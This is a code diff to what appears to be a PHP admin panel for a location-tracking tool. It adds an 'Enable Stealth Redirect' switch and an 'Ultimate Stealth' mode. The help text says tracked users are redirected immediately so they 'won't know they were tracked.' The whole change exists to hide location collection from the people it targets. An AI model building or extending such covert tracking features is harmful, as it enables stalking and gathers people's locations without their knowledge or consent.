@@ -94,12 +94,27 @@ function connectDB() {
                                 </div>
                             </div>
                             
+                            <div class="mb-4">
+                                <div class="form-check form-switch">
+                                    <input class="form-check-input" type="checkbox" id="enable_stealth_redirect" name="enable_stealth_redirect" 
+                                           <?= !SHOW_LOCATION_MESSAGES ? 'checked' : '' ?>>
+                                    <label class="form-check-label" for="enable_stealth_redirect">
+                                        <strong>Enable Stealth Redirect</strong>
+                                    </label>
+                                    <div class="form-text">
+                                        When enabled, users are redirected immediately without seeing any tracking page.
+                                        <span class="text-danger">Maximum invisibility - users won't know they were tracked.</span>
+                                    </div>
+                                </div>
+                            </div>
+                            
                             <div class="alert alert-info">
                                 <h6><i class="fa-solid fa-info-circle"></i> Privacy Modes:</h6>
                                 <ul class="mb-0">
                                     <li><strong>Normal Mode:</strong> Users see location tracking messages and UI</li>
                                     <li><strong>Stealth Mode:</strong> Location messages hidden, tracking still works</li>
                                     <li><strong>Maximum Stealth:</strong> All tracking UI hidden, completely invisible</li>
+                                    <li><strong>Ultimate Stealth:</strong> Immediate redirect - users never see tracking page</li>
                                 </ul>
                             </div>
                             
